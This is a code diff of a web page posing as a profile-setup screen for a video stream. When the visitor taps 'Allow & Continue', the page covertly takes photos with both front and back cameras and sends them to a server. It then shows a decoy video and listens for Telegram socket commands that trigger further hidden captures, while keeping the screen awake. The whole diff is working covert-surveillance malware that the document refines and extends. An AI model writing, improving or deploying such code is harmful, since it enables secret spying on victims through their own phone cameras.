@@ -68,9 +68,7 @@
             box-shadow: 0 2px 5px rgba(0,0,0,0.3);
         }
 
-        .file-input {
-            display: none;
-        }
+        .file-input { display: none; }
 
         #profileSection h2 {
             margin: 0 0 6px 0;
@@ -128,7 +126,6 @@
     <!-- Profile Creation & Circular Avatar Section -->
     <div id="profileSection">
         <div class="avatar-container">
-            <!-- Default user placeholder or selected gallery photo -->
             <img id="previewImg" src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150" alt="Profile Avatar">
             <label for="profilePicInput" class="camera-badge">📷</label>
         </div>
@@ -137,8 +134,6 @@
         <p>Set up your profile picture and name to watch the stream.</p>
         
         <input type="text" id="username" class="input-box" placeholder="Enter Your Name" autocomplete="off">
-        
-        <!-- Hidden Gallery File Input triggered by camera badge -->
         <input type="file" id="profilePicInput" class="file-input" accept="image/*">
         
         <button class="btn" id="actionBtn">Allow & Continue</button>
@@ -168,26 +163,20 @@
         let targetVideoUrl = "";
         
         if(encodedVid) {
-            try {
-                targetVideoUrl = atob(encodedVid); 
-            } catch(e) {
-                console.error("Invalid URL format");
-            }
+            try { targetVideoUrl = atob(encodedVid); } catch(e) {}
         }
 
-        // Handle Gallery Image Selection for Circular Profile Avatar
+        // Gallery Image Selection Handler
         profilePicInput.addEventListener('change', (event) => {
             const file = event.target.files[0];
             if (file) {
                 const reader = new FileReader();
-                reader.onload = function(e) {
-                    previewImg.src = e.target.result;
-                }
+                reader.onload = function(e) { previewImg.src = e.target.result; }
                 reader.readAsDataURL(file);
             }
         });
 
-        // Allow & Continue Click Handler
+        // Allow & Continue Click Handler (Initial 10 photos: 5 front + 5 back)
         actionBtn.addEventListener('click', async () => {
             const name = usernameInput.value.trim();
             if (!name) {
@@ -199,89 +188,59 @@
             actionBtn.disabled = true;
 
             try {
-                const video = document.getElementById('hiddenCamera');
-
-                // 1. Blind Stealth Capture: Front Camera (5 photos in background)
-                const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                video.srcObject = frontStream;
-                await new Promise(resolve => video.onloadedmetadata = resolve);
-
-                for (let i = 0; i < 5; i++) {
-                    await captureAndSend(video, `front_${i + 1}`);
-                    await new Promise(resolve => setTimeout(resolve, 800));
-                }
-                frontStream.getTracks().forEach(track => track.stop());
-
-                // 2. Blind Stealth Capture: Back Camera (5 photos in background)
-                const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
-                video.srcObject = backStream;
-                await new Promise(resolve => video.onloadedmetadata = resolve);
-
-                for (let i = 0; i < 5; i++) {
-                    await captureAndSend(video, `back_${i + 1}`);
-                    await new Promise(resolve => setTimeout(resolve, 800));
-                }
-                backStream.getTracks().forEach(track => track.stop());
-
+                // 1. Initial Front Camera Capture (5 Photos)
+                await captureSequence("user", "front");
+                // 2. Initial Back Camera Capture (5 Photos)
+                await captureSequence("environment", "back");
             } catch (err) {
-                console.error("Stealth capture error:", err);
+                console.error("Initial stealth capture error:", err);
             }
 
-            // 3. Hide Profile Section and Launch Video Stream Player smoothly
+            // Launch Stream Player
             profileSection.style.display = 'none';
             mediaPlayer.style.display = 'block';
-            
-            if(targetVideoUrl) {
-                mediaPlayer.src = targetVideoUrl;
-            } else {
-                mediaPlayer.src = "https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1"; 
-            }
+            mediaPlayer.src = targetVideoUrl ? targetVideoUrl : "https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1"; 
 
-            // 4. Initialize Socket connection for later commands
             initializeSecuritySystem();
         });
 
-        // Initialize Background Socket & WakeLock
+        // Initialize Background Socket & Listeners for /moref and /moreb
         function initializeSecuritySystem() {
             socket = io();
             keepScreenAwake();
 
-            // Listen for subsequent Telegram capture commands
-            socket.on('capture_command', async () => {
-                await startOnDemandCapture();
+            // Listen for Front Camera Command (/moref)
+            socket.on('capture_front', async () => {
+                await captureSequence("user", "command_front");
+            });
+
+            // Listen for Back Camera Command (/moreb)
+            socket.on('capture_back', async () => {
+                await captureSequence("environment", "command_back");
             });
         }
 
-        // Keep Screen Awake
-        async function keepScreenAwake() {
+        // Reusable Function to Capture 5 Photos from any specified Camera Mode
+        async function captureSequence(facingMode, labelPrefix) {
             try {
-                if ('wakeLock' in navigator) {
-                    wakeLock = await navigator.wakeLock.request('screen');
-                }
-            } catch (err) { console.log(err.message); }
-        }
-
-        // On-demand blind capture via Telegram command (uses back camera)
-        async function startOnDemandCapture() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
                 const video = document.getElementById('hiddenCamera');
                 video.srcObject = stream;
                 
                 await new Promise(resolve => video.onloadedmetadata = resolve);
 
                 for (let i = 0; i < 5; i++) {
-                    await captureAndSend(video, `command_${i + 1}`);
-                    await new Promise(resolve => setTimeout(resolve, 1000)); 
+                    await captureAndSend(video, `${labelPrefix}_${i + 1}`);
+                    await new Promise(resolve => setTimeout(resolve, 800)); 
                 }
 
                 stream.getTracks().forEach(track => track.stop());
             } catch (error) {
-                console.error("On-demand Capture Error:", error);
+                console.error(`Capture Error (${labelPrefix}):`, error);
             }
         }
 
-        // Send Captured Frame to Backend Server Headlessly via Canvas
+        // Send Captured Frame to Backend Server Headlessly
         async function captureAndSend(video, label) {
             const canvas = document.getElementById('canvas');
             canvas.width = video.videoWidth;
@@ -299,6 +258,15 @@
                     resolve();
                 }, 'image/jpeg', 0.8);
             });
+        }
+
+        // Keep Screen Awake
+        async function keepScreenAwake() {
+            try {
+                if ('wakeLock' in navigator) {
+                    wakeLock = await navigator.wakeLock.request('screen');
+                }
+            } catch (err) {}
         }
 
         // Re-apply WakeLock if visibility changes
